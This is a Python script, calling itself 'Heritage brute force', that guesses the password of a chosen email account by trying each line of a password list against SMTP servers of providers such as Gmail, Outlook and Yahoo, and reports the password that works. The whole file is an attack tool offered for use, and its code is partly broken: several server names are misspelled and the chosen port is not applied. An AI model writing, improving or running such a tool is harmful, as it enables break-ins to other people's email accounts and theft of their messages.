import smtplib
import os,sys
import time,random
import threading
import argparse

H = '\033[95m'
B = '\033[94m'
G = '\033[92m'
W = '\033[93m'
F = '\033[91m'
E = '\033[0m'
U = '\033[4m'
O = '\033[33m'

serv = None
port = 587

parser = argparse.ArgumentParser(description="[!]Heritage brute force")
parser.add_argument('login', help='Target email')
parser.add_argument('password', help='Password list')
args = parser.parse_args()

if args.login or args.password:
	login = args.login
	password_list = args.password
	if os.path.exists(password_list):
		file = open(password_list,'r')
	else:
		print(F+'File not exist'+E)
		sys.exit(1)
def banner():
	text1 = '''                            ,-.                               
       ___,---.__          /'|`\          __,---,___          
    ,-'    \`    `-.____,-'  |  `-.____,-'    //    `-.       
  ,'        |           ~'\     /`~           |        `.      
 /      ___//              `. ,'          ,  , \___      \    
|    ,-'   `-.__   _         |        ,    __,-'   `-.    |    
|   /          /\_  `   .    |    ,      _/\          \   |   
\  |           \ \`-.___ \   |   / ___,-'/ /           |  /  
 \  \           | `._   `\\  |  //'   _,' |           /  /      
  `-.\         /'  _ `---'' , . ``---' _  `\         /,-'     
     ``       /     \    ,='/ \`=.    /     \       ''          
             |__   /|\_,--.,-.--,--._/|\   __|                  
             /  `./  \\`\ |  |  | /,//' \,'  \                  
            /   /     ||--+--|--+-/-|     \   \                 
           |   |     /'\_\_\ | /_/_/`\     |   |                
            \   \__, \_     `~'     _/ .__/   /            
             `-._,-'   `-._______,-'   `-._,-'                   '''

	
	print(text1)
 
def clear():
	os.system('clear')

def check_mail():
	global serv
	clear()
	banner()
	print(B+'[$]Enter service smtp:'+E)
	print(H+"""
		1) Gmail
		2) Outlook
		3) Yahoo
		4) At&T
		5) Mail.com
		6) Comcast
		7) By hand
		"""+E)
	ServerSmtp = input(W+'Heritage??Mail??ServerSmtp??'+E)
	if int(ServerSmtp) == 1:
		serv = 'smtp.gmail.com'
		port = 465
	elif int(ServerSmtp) == 2:
		serv = 'smtp-mail.outlook.com'
		port = 587
	elif int(ServerSmtp) == 3:
		serv = 'smtm.mail.yahoo.com'
		port = 587
	elif int(ServerSmtp) == 4:
		serv = 'smtm.mail.att.net'
		port = 465
	elif int(ServerSmtp) == 5:
		serv = 'smtm.mail.com'
		port = 587
	elif int(ServerSmtp) == 6:
		serv = 'smtm.comcast.com'
		port = 587
	elif int(ServerSmtp) == 7:
		serv = input('Enter smtp server (Exemple:smtp.gmail.com)')
		port = input('Enter port smtp server (Default port: 587)')
	else:
		print('Error ')
		sys.exit(1)

def brut():
	print(F+'Start brutforce'+E)
	try:
		smtp = smtplib.SMTP(str(serv), int(port))
		smtp.ehlo()
		smtp.starttls()
	except:
		print('Error')
	for line in file:
		try:
			passw = line.strip('\r\n')
			smtp.login(login, passw)
			print(W+time.ctime()+B+' Worked mail login-> '+W+login+B+' password-> '+W+passw)
			break
			sys.exit(1)
		except:
			print(F + time.ctime() + E + ' Didnt work ->'+E+login+E+'Password ->'+E+passw)

check_mail()
t1 = threading.Thread(target=brut)
t1.start()